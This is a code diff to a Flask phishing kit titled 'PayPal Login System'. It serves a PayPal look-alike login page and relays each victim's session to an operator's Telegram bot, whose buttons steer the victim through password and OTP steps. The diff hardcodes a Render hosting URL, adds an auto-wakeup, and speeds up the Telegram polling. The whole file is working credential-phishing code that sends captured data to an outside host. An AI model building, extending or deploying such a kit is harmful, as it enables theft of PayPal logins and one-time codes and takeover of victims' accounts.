@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PayPal Login System - ULTIMATE RENDER SOLUTION
+PayPal Login System - ULTIMATE RENDER FIX
 Auto-wakeup every 10 minutes + Instant Telegram processing
 """
 
@@ -8,11 +8,10 @@ from flask import Flask, request, jsonify, render_template_string
 import requests
 import time
 import logging
-from datetime import datetime, timedelta
+from datetime import datetime
 import os
 import threading
 import schedule
-import atexit
 
 # Ultra-fast logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -29,8 +28,8 @@ sessions = {}
 last_processed_id = 0
 
 # Auto-wakeup configuration
+RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', 'https://login-system-mey3.onrender.com')
 app_start_time = time.time()
-RENDER_URL = os.getenv('RENDER_EXTERNAL_URL', 'http://localhost:5000')
 
 def send_telegram_message(text, reply_markup=None):
     """ULTRA-FAST Telegram message sending"""
@@ -40,7 +39,7 @@ def send_telegram_message(text, reply_markup=None):
         'chat_id': CHAT_ID,
         'text': text,
         'parse_mode': 'HTML',
-        'disable_notification': True
+        'disable_notification': True  # Faster without notifications
     }
     
     if reply_markup:
@@ -120,9 +119,9 @@ def process_telegram_command(command):
                 sessions[session_id]['action'] = action_map[action_key]
                 sessions[session_id]['last_update'] = time.time()
                 
-                logger.info(f"⚡ Action: {action_map[action_key]} for {session_id[-8:]}")
+                logger.info(f"⚡ INSTANT Action: {action_map[action_key]} for {session_id[-8:]}")
                 
-                # Send confirmation
+                # Send instant confirmation
                 action_names = {
                     'show_password': '🔑 PASSWORD STEP',
                     'show_otp': '🔢 OTP STEP', 
@@ -147,13 +146,13 @@ def process_telegram_command(command):
         return False
 
 def check_telegram_updates():
-    """Check for new Telegram updates"""
+    """ULTRA-FAST Telegram update checking"""
     global last_processed_id
     
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
         params = {
-            'timeout': 1,
+            'timeout': 1,  # Ultra-short timeout
             'offset': last_processed_id + 1,
             'allowed_updates': ['callback_query']
         }
@@ -167,12 +166,14 @@ def check_telegram_updates():
                     update_id = update['update_id']
                     last_processed_id = max(last_processed_id, update_id)
                     
-                    # Process callback queries
+                    # Process callback queries INSTANTLY
                     if 'callback_query' in update:
                         callback_data = update['callback_query']['data']
-                        logger.info(f"⚡ Telegram Command: {callback_data}")
+                        logger.info(f"⚡ INSTANT Telegram Command: {callback_data}")
+                        
+                        # Process command immediately
                         process_telegram_command(callback_data)
-                
+                        
                 return True
         return False
     except Exception as e:
@@ -328,7 +329,7 @@ PAYPAL_TEMPLATE = '''
         .spinner { width: 3rem; height: 3rem; border: 3px solid #e5e7eb; border-top-color: #0070ba; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 1rem; }
         .loading-text { font-size: 1rem; color: #374151; text-align: center; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .error-message { color: #dc2626; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; animation: shake 0.5s; }
+        .error-message { color: #dc2626; font-size: 0.875rem; text-decoration: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #fef2f2; border-radius: 0.25rem; border: 1px solid #fecaca; animation: shake 0.5s; }
         .success-message { color: #059669; font-size: 0.875rem; text-align: center; margin-bottom: 1rem; padding: 0.5rem; background-color: #f0fdf4; border-radius: 0.25rem; border: 1px solid #bbf7d0; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         footer { border-top: 1px solid #e5e7eb; padding: 1.5rem 0; }
@@ -538,7 +539,7 @@ PAYPAL_TEMPLATE = '''
                 }
                 
                 // Also trigger immediate Telegram processing
-                await fetch('/process-telegram', {method: 'POST'});
+                await fetch('/process-now', {method: 'POST'});
                 
             } catch (error) {
                 console.error('Status check error:', error);
@@ -746,9 +747,9 @@ def status():
     
     return jsonify({'action': action})
 
-@app.route('/process-telegram', methods=['POST'])
-def process_telegram():
-    """Process Telegram updates"""
+@app.route('/process-now', methods=['POST'])
+def process_now():
+    """INSTANT Telegram processing endpoint"""
     try:
         check_telegram_updates()
         return jsonify({'success': True, 'processed': True})
